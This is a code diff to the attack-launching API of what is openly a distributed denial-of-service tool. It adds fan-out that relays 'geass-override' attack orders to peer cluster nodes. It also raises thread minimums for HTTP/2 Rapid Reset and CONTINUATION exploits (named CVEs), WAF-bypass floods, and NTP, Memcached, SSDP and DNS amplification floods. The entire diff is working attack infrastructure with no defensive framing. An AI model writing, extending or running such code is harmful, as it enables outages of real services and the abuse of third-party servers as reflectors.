@@ -24,6 +24,20 @@ import {
   StopAttackParams,
 } from "@workspace/api-zod";
 import { proxyCache } from "./proxies.js";
+import { CLUSTER_NODES } from "./cluster.js";
+
+// ── Cluster fan-out — fires geass-override to all peer nodes (fire & forget) ─
+function fanOutToCluster(target: string, port: number, method: string, duration: number, threads: number): void {
+  if (CLUSTER_NODES.length === 0) return;
+  for (const nodeUrl of CLUSTER_NODES) {
+    void fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks?peer=1`, {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify({ target, port, method, duration, threads }),
+      signal:  AbortSignal.timeout(8000),
+    }).catch(() => { /* peer may be unreachable — ignore */ });
+  }
+}
 
 const router: IRouter = Router();
 
@@ -262,10 +276,10 @@ async function runAttackWorkers(
     // Heavy hitters: H2 RST, H2 CONTINUATION, H2 Storm, WAF Bypass, HTTP Pipeline
     const connT   = Math.max(100, Math.round(threads * 0.06));
     const slowT   = Math.max(100, Math.round(threads * 0.06));
-    const h2T     = Math.max(350, Math.round(threads * 0.26)); // ★ CVE-2023-44487 dominant
-    const contT   = Math.max(220, Math.round(threads * 0.20)); // ★ CVE-2024-27316 OOM
-    const hpackT  = Math.max(180, Math.round(threads * 0.15)); // ★ HPACK eviction storm
-    const wafT    = Math.max(180, Math.round(threads * 0.18)); // ★ CF/Akamai WAF bypass
+    const h2T     = Math.max(800, Math.round(threads * 0.26)); // ★ CVE-2023-44487 dominant  (32GB: 800 min)
+    const contT   = Math.max(650, Math.round(threads * 0.20)); // ★ CVE-2024-27316 OOM       (32GB: 650 min)
+    const hpackT  = Math.max(400, Math.round(threads * 0.15)); // ★ HPACK eviction storm     (32GB: 400 min)
+    const wafT    = Math.max(400, Math.round(threads * 0.18)); // ★ CF/Akamai WAF bypass     (32GB: 400 min)
     const wsT     = Math.max(80,  Math.round(threads * 0.06));
     const gqlT    = Math.max(50,  Math.round(threads * 0.04));
     const udpT    = Math.max(64,  Math.round(threads * 0.04));
@@ -274,14 +288,14 @@ async function runAttackWorkers(
     const tlsT    = Math.max(50,  Math.round(threads * 0.04));
     const quicT   = Math.max(32,  Math.round(threads * 0.03));
     const sslT    = Math.max(60,  Math.round(threads * 0.05));
-    const stormT  = Math.max(180, Math.round(threads * 0.22)); // ★ H2 Settings Storm proven
-    const pipeT   = Math.max(450, Math.round(threads * 0.32)); // ★ HTTP Pipeline 300K req/s per worker
+    const stormT  = Math.max(400, Math.round(threads * 0.22)); // ★ H2 Settings Storm proven  (32GB: 400 min)
+    const pipeT   = Math.max(1200, Math.round(threads * 0.32)); // ★ HTTP Pipeline 300K req/s  (32GB: 1200 min)
     // L3/UDP — each gets its own thread pool; single worker uses all threads as socket count
-    const icmpT   = Math.max(64,  Math.round(threads * 0.08)); // ICMP: 64 sockets saturates 1Gbps link
-    const dnsT    = Math.max(64,  Math.round(threads * 0.06)); // DNS Water Torture: 64 UDP sockets
-    const ntpT    = Math.max(64,  Math.round(threads * 0.05)); // NTP mode 7 monlist
-    const memT    = Math.max(64,  Math.round(threads * 0.05)); // Memcached binary UDP
-    const ssdpT   = Math.max(64,  Math.round(threads * 0.05)); // SSDP M-SEARCH
+    const icmpT   = Math.max(512, Math.round(threads * 0.08)); // ICMP: 512 sockets → multi-Gbps saturation
+    const dnsT    = Math.max(512, Math.round(threads * 0.06)); // DNS Water Torture: 512 UDP sockets
+    const ntpT    = Math.max(512, Math.round(threads * 0.05)); // NTP mode 7 monlist: 512 sockets
+    const memT    = Math.max(256, Math.round(threads * 0.05)); // Memcached binary UDP: 256 sockets
+    const ssdpT   = Math.max(256, Math.round(threads * 0.05)); // SSDP M-SEARCH: 256 sockets
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
@@ -356,6 +370,11 @@ router.post("/attacks", async (req, res): Promise<void> => {
   liveBps.set(id, 0);
   prevPktsSnap.set(id, 0);
   prevBytesSnap.set(id, 0);
+
+  // ── Geass Override cluster fan-out (primary node only, not peer) ────────────
+  if (method === "geass-override" && !req.query.peer) {
+    fanOutToCluster(target, port, method, duration, threads);
+  }
 
   void runAttackWorkers(method, target, port, threads, ctrl.signal,
     (pkts, bytes, conns) => onWorkerStats(id, pkts, bytes, conns)
